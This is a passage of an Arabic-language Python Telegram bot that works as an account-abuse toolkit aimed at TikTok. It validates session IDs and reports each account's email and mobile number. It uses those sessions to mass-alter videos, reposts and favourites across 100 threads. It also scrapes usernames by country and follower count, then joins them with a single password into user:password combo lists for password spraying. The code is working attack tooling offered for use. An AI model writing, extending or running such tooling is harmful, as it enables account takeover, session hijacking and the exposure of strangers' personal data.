                    data = ress.json()["data"]
                    username = data.get('username', 'N/A')
                    user_id_tk = data.get('user_id', 0)
                    if user_id_tk == 0 or username == 'N/A':
                        invalid_count += 1
                        update_stats("invalid")
                        continue
                    valid_count += 1
                    update_stats("valid")
                    report_text += f"{emoji_username} Username: {username}\n{emoji_userid} User ID: {user_id_tk}\n{emoji_email_f} Email: {data.get('email', 'N/A')}\n{emoji_mobile_f} Mobile: {data.get('mobile', 'N/A')}\n{emoji_verified_f} Verified: {data.get('user_verified', 'False')}\n{emoji_session_f} Session: {session_id}\n───────────────────\n"
                else:
                    invalid_count += 1
                    update_stats("invalid")
            except:
                invalid_count += 1
                update_stats("invalid")
        try:
            bot.delete_message(message.chat.id, status_msg.message_id)
        except:
            pass
        if not report_text:
            bot.send_message(message.chat.id, f"<b>{emoji_ban} جميع الحسابات غير صالحة.</b>", parse_mode="HTML")
        else:
            bot.send_message(message.chat.id, "<b>🏁 تم إكمال الفحص!</b>", parse_mode="HTML")
            if len(report_text) > 4000:
                chunks = report_text.strip().split("───────────────────\n")
                current_chunk_text = ""
                for chunk in chunks:
                    if chunk.strip():
                        chunk_formatted = chunk + "───────────────────\n"
                    if len(current_chunk_text) + len(chunk_formatted) > 3900:
                        bot.send_message(message.chat.id, f"<b>{current_chunk_text.strip()}</b>", parse_mode="HTML")
                        current_chunk_text = ""
                    current_chunk_text += chunk_formatted
                if current_chunk_text.strip():
                    bot.send_message(message.chat.id, f"<b>{current_chunk_text.strip()}</b>", parse_mode="HTML")
            else:
                bot.send_message(message.chat.id, f"<b>{report_text.strip()}</b>", parse_mode="HTML")
        bot.send_message(message.chat.id, f"<b>🏁 نتيجة الفحص:\n\n✅ صالحة: {valid_count}\n❌ فاشلة: {invalid_count}</b>", parse_mode="HTML")
        user_states[user_id] = None
    except Exception as e:
        bot.send_message(message.chat.id, f"<b>{emoji_ban} خطأ: {e}</b>", parse_mode="HTML")
        user_states[user_id] = None

def ask_for_tiktok_session(message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    if not state or state not in ["tiktok_private", "tiktok_cancel_repost", "tiktok_cancel_favo", "make_videos_public"]:
        return
    session_id = message.text.strip()
    tool_names = {
        "tiktok_private": "جعل الفيديوهات خاصة",
        "tiktok_cancel_repost": "الغاء اعادة النشر",
        "tiktok_cancel_favo": "الغاء المفضلة",
        "make_videos_public": "جعل الفيديوهات عامة"
    }
    notify_action(message.from_user, tool_names[state])
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري {tool_names[state]}...</b>", parse_mode="HTML")
    demo = DEMO(session_id, state[-1])
    uid = demo.login_sessionid()
    if not uid:
        bot.edit_message_text(f"<b>{emoji_ban} السيشن غير صالح.</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
        user_states[user_id] = None
        return
    try:
        if state == "tiktok_private":
            fids = demo.get_id_to_private
            sele = demo.private_video
        elif state == "tiktok_cancel_repost":
            fids = demo.get_id_to_repost
            sele = demo.cancel_repost
        elif state == "tiktok_cancel_favo":
            fids = demo.get_id_to_Favo
            sele = demo.cancel_Favo
        elif state == "make_videos_public":
            fids = demo.get_id_to_public
            sele = demo.public_video
        count_done = 0
        while True:
            ids = fids()
            if not ids:
                break
            count_done += len(ids)
            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                ff = [executor.submit(sele, idd) for idd in ids]
                concurrent.futures.wait(ff)
        bot.edit_message_text(f"<b>{emoji_check} تم بنجاح! ({count_done})</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(f"<b>{emoji_ban} خطأ: {str(e)}</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
    user_states[user_id] = None

# ==================== دوال السحب ====================

def process_scrape_region(message):
    cid = message.chat.id
    region = message.text.strip().upper()
    try:
        country = pycountry.countries.get(alpha_2=region)
        country_name = country.name if country else region
    except:
        bot.send_message(cid, f"<b>{emoji_ban} رمز دولة غير صالح!</b>", parse_mode="HTML")
        bot.register_next_step_handler(message, process_scrape_region)
        return
    temp_data[cid] = {'region': region, 'country_name': country_name}
    user_states[cid] = "scrape_list_min"
    msg = bot.send_message(cid, f"<b>{emoji_check} الدولة: {country_name} ({region})\n{emoji_users} أرسل أقل عدد متابعين (مثال: 10):</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_scrape_min)

def process_scrape_min(message):
    cid = message.chat.id
    try:
        min_fol = int(message.text.strip())
        if min_fol < 0:
            raise ValueError
    except:
        bot.send_message(cid, f"<b>{emoji_ban} يرجى إرسال رقم صحيح!</b>", parse_mode="HTML")
        bot.register_next_step_handler(message, process_scrape_min)
        return
    temp_data[cid]['min_fol'] = min_fol
    user_states[cid] = "scrape_list_max"
    msg = bot.send_message(cid, f"<b>{emoji_check} أقل عدد: {min_fol:,}\n{emoji_users} أرسل أعلى عدد متابعين (مثال: 10000):</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_scrape_max)

def process_scrape_max(message):
    cid = message.chat.id
    try:
        max_fol = int(message.text.strip())
        if max_fol < 0:
            raise ValueError
    except:
        bot.send_message(cid, f"<b>{emoji_ban} يرجى إرسال رقم صحيح!</b>", parse_mode="HTML")
        bot.register_next_step_handler(message, process_scrape_max)
        return
    data = temp_data.get(cid, {})
    region = data.get('region', 'IQ')
    country_name = data.get('country_name', region)
    min_fol = data.get('min_fol', 10)
    if max_fol < min_fol:
        bot.send_message(cid, f"<b>{emoji_ban} أعلى عدد يجب أن يكون أكبر من ({min_fol:,})!</b>", parse_mode="HTML")
        bot.register_next_step_handler(message, process_scrape_max)
        return
    if cid in temp_data:
        del temp_data[cid]
    user_states[cid] = None
    status_msg = bot.send_message(cid, f"<b>{emoji_download} جاري سحب اللسته...\n{emoji_globe} الدولة: {country_name}\n{emoji_users} المتابعين: {min_fol:,} - {max_fol:,}\n{emoji_search} عدد عمليات البحث: 0\n{emoji_list} عدد اليوزرات المسحوبة: 0</b>", parse_mode="HTML", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("ايقاف السحب", callback_data=f"stop_scrape_{cid}")))
    scraper = UsernameScraper(region, min_fol, max_fol, cid, status_msg.message_id)
    scraping_tasks[cid] = scraper

    def run_scrape():
        try:
            usernames = scraper.start_scraping()
        except:
            usernames = scraper.usernames
        if cid in scraping_tasks:
            del scraping_tasks[cid]
        try:
            bot.delete_message(cid, status_msg.message_id)
        except:
            pass
        if usernames:
            filename = f"scraped_{region}_{len(usernames)}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write("\n".join(usernames))
            with open(filename, "rb") as f:
                bot.send_document(cid, f, caption=f"<b>{emoji_check} تم سحب {len(usernames)} يوزر\n{emoji_globe} الدولة: {country_name}</b>", parse_mode="HTML")
            os.remove(filename)
        else:
            if scraper.stop_scraping:
                if scraper.usernames:
                    filename = f"scraped_{region}_{len(scraper.usernames)}.txt"
                    with open(filename, "w", encoding="utf-8") as f:
                        f.write("\n".join(scraper.usernames))
                    with open(filename, "rb") as f:
                        bot.send_document(cid, f, caption=f"<b>{emoji_stop} تم ايقاف السحب\n{emoji_check} تم سحب {len(scraper.usernames)} يوزر</b>", parse_mode="HTML")
                    os.remove(filename)
                else:
                    bot.send_message(cid, f"<b>{emoji_stop} تم ايقاف السحب</b>", parse_mode="HTML")
            else:
                bot.send_message(cid, f"<b>{emoji_ban} لم يتم العثور على يوزرات</b>", parse_mode="HTML")
    thread = Thread(target=run_scrape)
    thread.start()

def process_add_password_file(message):
    cid = message.chat.id
    if not message.document or not message.document.file_name.endswith('.txt'):
        bot.send_message(cid, f"<b>{emoji_ban} يرجى إرسال ملف .txt</b>", parse_mode="HTML")
        user_states[cid] = None
        return
    temp_data[cid] = {'usernames_file': message.document.file_id}
    msg = bot.send_message(cid, f"<b>{emoji_lock} أرسل الباسوورد:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_add_password_final)

def process_add_password_final(message):
    cid = message.chat.id
    password = message.text.strip()
    file_id = temp_data.get(cid, {}).get('usernames_file', '')
    status_msg = bot.send_message(cid, f"<b>{emoji1} جاري إضافة الباسوورد...</b>", parse_mode="HTML")
    try:
        file_info = bot.get_file(file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8')
        usernames = [line.strip() for line in content.split('\n') if line.strip()]
        filename = f"with_password_{len(usernames)}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            for user in usernames:
                f.write(f"{user}:{password}\n")
        try:
            bot.delete_message(cid, status_msg.message_id)
        except:
            pass
        with open(filename, "rb") as f:
            bot.send_document(cid, f, caption=f"<b>{emoji_check} تم إضافة الباسوورد لـ {len(usernames)} يوزر\n{emoji_lock} الباسوورد: {password}</b>", parse_mode="HTML")
        os.remove(filename)
    except Exception as e:
        try:
            bot.delete_message(cid, status_msg.message_id)
        except:
            pass
        bot.send_message(cid, f"<b>{emoji_ban} خطأ: {str(e)}</b>", parse_mode="HTML")
    user_states[cid] = None

# ==================== الحلقة الرئيسية ====================

def main():
    logger = logging.getLogger(__name__)
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    logger.info("🚀 تشغيل البوت...")
    logger.info(f"✅ MAX_WORKERS: {MAX_WORKERS}")
    logger.info(f"✅ BATCH_SIZE: {BATCH_SIZE}")
    logger.info(f"✅ ADMIN_IDS: {ADMIN_IDS}")
    
    # تشغيل الخدمات التلقائية
    start_auto_backup()
    start_daily_report()
    logger.info("✅ تم تشغيل الخدمات التلقائية")
    
    last_update_id = 0
    retry_count = 0
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            params = {
                "offset": last_update_id + 1,
                "timeout": 30
            }
            
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                retry_count = 0
                updates = response.json()
                
                if updates.get("ok") and updates.get("result"):
                    for update in updates["result"]:
                        try:
                            handle_update(update)
                        except Exception as e:
                            logger.error(f"خطأ في معالجة تحديث: {e}")
                        
                        if update.get("update_id", 0) > last_update_id:
                            last_update_id = update["update_id"]
            else:
                retry_count += 1
                logger.warning(f"خطأ في الاتصال: {response.status_code}, المحاولة {retry_count}")
                if retry_count >= MAX_RETRIES:
                    logger.error("تم الوصول للحد الأقصى من المحاولات. إعادة تشغيل...")
                    retry_count = 0
                    time.sleep(10)
            
            time.sleep(1)
            
        except requests.exceptions.Timeout:
            logger.warning("انتهى وقت الانتظار، إعادة المحاولة...")
            time.sleep(2)
        except KeyboardInterrupt:
            logger.info("🛑 تم إيقاف البوت بواسطة المستخدم.")
            break
        except Exception as e:
            logger.error(f"خطأ في الحلقة الرئيسية: {e}")
            time.sleep(5)

# ==================== دالة معالجة التحديثات ====================

def handle_update(update):
    try:
        if "message" not in update:
            return
        message = update["message"]
        chat_id = message["chat"]["id"]
        user_id = message["from"]["id"]
        text = message.get("text", "")
        if not text:
            return
        # هنا يمكن إضافة معالجة الرسائل العادية
    except Exception as e:
        print(f"خطأ في handle_update: {e}")

# ==================== تشغيل البوت ====================

if __name__ == "__main__":
    main()
